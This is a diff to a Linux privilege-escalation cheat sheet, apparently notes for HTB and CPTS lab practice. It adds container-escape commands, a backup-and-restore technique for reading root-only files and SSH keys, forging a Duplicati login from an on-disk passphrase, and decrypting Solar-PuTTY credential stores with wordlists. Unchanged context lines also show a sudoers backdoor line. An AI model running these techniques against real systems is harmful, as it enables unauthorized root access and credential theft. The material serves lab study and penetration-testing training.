@@ -548,15 +548,29 @@ echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 sudo bash
 ```
 
-### Writable script called by root (general)
+### Who owns / who can write — enumeration
+
+The discovery step for everything above: find what a given user owns, and what **you** can write.
 
 ```bash
-# Find files owned by root that are world-writable
-find / -user root -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/dev"
+# Everything owned by a specific USER — run right after you learn another user's uid,
+# to see what they own before pivoting to them (e.g. their scripts, keys, configs)
+find / -user marcus -type f 2>/dev/null        # files owned by <user>
+find / -user marcus 2>/dev/null                # files + dirs
+find / -group devs 2>/dev/null                 # owned by a <group>
 
-# Or group-writable files where you're in the group
-find / -group $(id -g) -writable -not -path "/proc/*" 2>/dev/null
+# Owned by ME — often the files a root cron/service also reads or runs
+find / -user "$(whoami)" -type f -not -path "/proc/*" 2>/dev/null
+
+# The real prize — what I can WRITE (root reads/executes it → privesc)
+find / -writable -type f -not -path "/proc/*" 2>/dev/null                # writable files
+find / -writable -type d -not -path "/proc/*" 2>/dev/null                # writable DIRS — drop/replace a file inside
+find / -user root -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/dev"   # root-owned, writable by me
+find / -group "$(id -g)" -writable -not -path "/proc/*" 2>/dev/null      # group-writable where I'm in the group
+find / -perm -o+w -type f -not -path "/proc/*" 2>/dev/null               # world-writable files
 ```
+
+> [!tip] `-writable` is a GNU-find extension and resolves against **your effective uid/gid** — the most direct "what can I actually touch" query. On busybox it's absent → fall back to `-perm -o+w` or matching your uid/gid. And a writable **directory** is as good as a writable file when a root process reads from it: you don't need write on the file if you can replace it in a dir you control.
 
 ---
 
@@ -755,61 +769,74 @@ ip link set eth0 down && ip link set eth0 up
 
 ---
 
-## Docker / LXC Escape
+## Container Escape
 
-### Check if in a container
-
-```bash
-cat /proc/1/cgroup | grep docker
-ls /.dockerenv                  # Exists inside Docker containers
-env | grep -i kube
-```
-
-### Docker group
-
-Being in the `docker` group is equivalent to root:
+If this shell is inside a container, escaping to the host **is** the privesc. Quick checks + the two most common instant wins below; the full escape-surface workflow (docker.sock, dangerous capabilities, `release_agent`, sensitive host mounts, K8s pod→node) is its own note.
 
 ```bash
-id | grep docker
-groups | grep docker
+# Am I in a container?
+ls /.dockerenv; systemd-detect-virt -c; cat /proc/1/cgroup
 
-# Mount host filesystem
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# docker / lxd group = root-equivalent (both mount host / into a new container)
+id | grep -E 'docker|lxd'
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh          # docker group
 
-# Or start a privileged container
-docker run --rm -it --privileged --net=host alpine sh
-# Inside: mount /dev/sda1 /mnt → access host FS
+# Privileged container / host disk visible → just mount + chroot
+fdisk -l && mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host
 ```
 
-### LXC / LXD group
+> [!note] **Full workflow → [[Techniques/Container Escape|Container Escape]].** Capability triage (`CAP_SYS_ADMIN` release_agent, `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`), mounted `docker.sock` abuse, `core_pattern`, lxd image build, and the Kubernetes pod→node path all live there.
+
+---
+
+## Backup / Sync Software Running as Root
+
+A backup or sync tool (Duplicati, Restic, BorgBackup, UrBackup, Bacula, rsnapshot, a cron `tar`/`rsync`) running as **root** is a privesc primitive in its own right: **backup + restore = arbitrary root-owned file read and write.** You don't need a CVE — you need the tool's own UI/CLI and a source/destination path you can read afterward.
+
+**Find it first.** These tools usually bind a management port to **localhost**, so they're invisible to an external scan — re-enumerate from every shell:
 
 ```bash
-id | grep lxd
-
-# On attacker — build a minimal Alpine image
-git clone https://github.com/saghul/lxd-alpine-builder
-cd lxd-alpine-builder && sudo bash build-alpine
-# Transfer alpine.tar.gz to target
-
-# On target
-lxc image import ./alpine.tar.gz --alias myimage
-lxc init myimage mycontainer -c security.privileged=true
-lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
-lxc start mycontainer
-lxc exec mycontainer /bin/sh
-# Inside: cd /mnt/root → full host FS access as root
+ss -tulpn                       # look for 127.0.0.1 admin ports (Duplicati 8200, UrBackup 55414, etc.)
+ps aux | grep -Ei 'duplicati|restic|borg|urbackup|bacula|rsnapshot'   # and who runs them (root?)
+curl -sI http://127.0.0.1:8200/ # fingerprint → version → known auth/CVE
 ```
 
-### Privileged container breakout
+**The primitive:** point a backup job's **source** at a root-only path and its **destination** somewhere you can read; then **restore** with owner/permission preservation **turned off** so the files land world-readable.
 
-If already inside a privileged container:
+```text
+Backup  SOURCE = /root/            DEST = /tmp/rootbak     → Run now
+Restore PICK   = /tmp/loot         [ ] Restore read/write permissions   ← UNCHECK
+On box: cat /tmp/loot/root.txt          # and grab /tmp/loot/.ssh/id_rsa → ssh -i id_rsa root@…
+```
+
+> [!tip] **Uncheck "restore permissions."** Files normally restore with their original owner/mode (`root:root 400`) — still unreadable to you. Restoring **without** permission preservation drops them at the default (`root:root ~644`) = world-readable. `/root/.ssh/id_rsa` restored this way gives a real root shell, which beats reading a single flag.
+
+### Containerized service → host-FS mount prefix
+
+If the backup tool runs in a **Docker container**, its filesystem view is the container's, not the host's — but a bind-mount of the host root re-exposes everything under a **path prefix**. The **TargetURL / configured source path gives it away**: a job pointed at `file:///source/opt/…` when there's no `/source` on the box means `/source/` **is** a mount of host `/`.
+
+```text
+container /source/  ==  host /         →  /source/root/ = host /root, /source/tmp/x = host /tmp/x
+```
+
+Confirm by matching where backup files actually land on the host against the container's target path. Then a service running **as root in the container with host `/` mounted** can back up `/source/root/` and restore it anywhere host-side — full root read/write without ever escaping the container.
+
+### Duplicati (worked example — auth is a file-read, not a crack)
+
+Duplicati's web login (`:8200`) is a **nonce/HMAC challenge**, not a form password — and the secret it checks against, `server-passphrase`, sits in its own config DB. So the "way in" is **reading the passphrase off disk and answering the challenge with it**, never guessing:
 
 ```bash
-fdisk -l                        # List host disks
-mkdir /mnt/host
-mount /dev/sda1 /mnt/host       # Mount host FS
-chroot /mnt/host                # Root on host
+# marcus-readable; no sqlite3 on box → scp to Kali (python3 stdlib reads it too)
+scp target:/opt/duplicati/config/Duplicati-server.sqlite .
+strings Duplicati-server.sqlite | grep -i passphrase    # Option table: server-passphrase (+ salt)
+# Forge login: answer = base64(SHA256(nonce_bytes + b64decode(server-passphrase)))
+#   flow (from the app's own login.js): GET / (xsrf cookie) → POST /login.cgi get-nonce=1 → answer → POST /login.cgi
+# Drive the UI over a tunnel: ssh -L 8200:127.0.0.1:8200 marcus@target  (see Pivoting note)
 ```
+
+Once in the console, use the backup/restore primitive above. Two reusable lessons here: **read the app's own client JS** (`login.js` handed over `/login.cgi` + the exact hash algorithm — ended the guessing), and **a secret on disk beats cracking** — the salted hash *is* the credential.
+
+> [!note] The presence-only auth (hold the hash → pass) and the Cacti package-import RCE on the same box are both the [[Exploits/Signature Verification Bypass|CWE-347 pattern]]: a check that trusts material the attacker already controls. Cross-refs: [[Class notes/HTB Academy/CPTS v2 (claude)/Pivoting, Tunneling & Port Forwarding|Pivoting]] (tunnel the localhost admin port), [[Services/Web Services/Docker API|Docker API]].
 
 ---
 
@@ -859,6 +886,25 @@ cat ~/.ssh/id_rsa
 ls -la ~/.ssh/
 ls -la ~/.gnupg/            # GPG keys — may unlock encrypted files or password managers
 ```
+
+### Saved-session credential stores (SSH/RDP clients, password managers)
+
+Connection managers and clients cache **hostnames + usernames + passwords/keys** in a single file — often reachable via an owned-file sweep (`find / -user $(whoami) -type f 2>/dev/null | grep -v '^/proc'`). Hunt these before assuming you're stuck:
+
+```bash
+# Solar-PuTTY (SolarWinds) — sessions stored AES-encrypted + base64 under a user passphrase
+find / -iname 'sessions-backup.dat' -o -iname 'SolarPutty*' 2>/dev/null   # e.g. /opt/backups/Solar-PuTTY/
+# PuTTY (saved sessions incl. proxy passwords) — HKCU\Software\SimonTatham\PuTTY on Windows
+# WinSCP.ini / mRemoteNG confCons.xml / KeePass *.kdbx / .git-credentials / .netrc / .aws/credentials
+find / \( -iname '*.kdbx' -o -iname 'WinSCP.ini' -o -iname 'confCons.xml' \
+       -o -iname '.git-credentials' -o -iname '.netrc' \) 2>/dev/null
+```
+
+> [!tip] **Solar-PuTTY `sessions-backup.dat`** decrypts with a **wordlist** — its KDF is weak (SHA1/`PasswordDeriveBytes`, low iterations, **CVE-2020-14005**), unlike a 600k-round PBKDF2. **`head -c 200` it first** — sometimes it's plain JSON, not encrypted. Decrypt with the modernised **[SolarPuttyDecryptV2](https://github.com/Er2oneousbit/SolarPuttyDecryptV2)** fork (fixes an IV-length bug that breaks the original on .NET 6):
+> ```bash
+> SolarPuttyDecrypt sessions-backup.dat -w /usr/share/wordlists/rockyou.txt   # or: ... sessions-backup.dat <passphrase>
+> ```
+> The recovered JSON holds `Sessions[]` + `Credentials[]` — hostnames, usernames, and **plaintext passwords / private keys** (HTB *Instant*: yielded the **root** password). A password you cracked elsewhere is worth trying as the store's passphrase — export passphrases get reused.
 
 ### Password in scripts / env
 
@@ -1194,10 +1240,12 @@ HIJACKABLE SESSIONS
 [ ] tmux -S <socket> attach   then   sudo -n true && sudo -i   ← ride cached sudo
 [ ] screen -ls / ls -la /run/screen/ — same idea for GNU screen
 
-CONTAINERS
+CONTAINERS  (full workflow: [[Techniques/Container Escape]])
 [ ] ls /.dockerenv — in Docker?
 [ ] id | grep docker — docker group → instant root
 [ ] id | grep lxd — LXD group → host FS access
+[ ] ls -la /var/run/docker.sock — mounted socket → root on host
+[ ] capsh --print — CAP_SYS_ADMIN / SYS_MODULE / DAC_READ_SEARCH → escape
 
 KERNEL (last resort — can panic the host)
 [ ] ./linux-exploit-suggester.sh
@@ -1213,5 +1261,5 @@ KERNEL (last resort — can panic the host)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-21*
+*Updated: 2026-08-28*
 *Model: claude-opus-5*
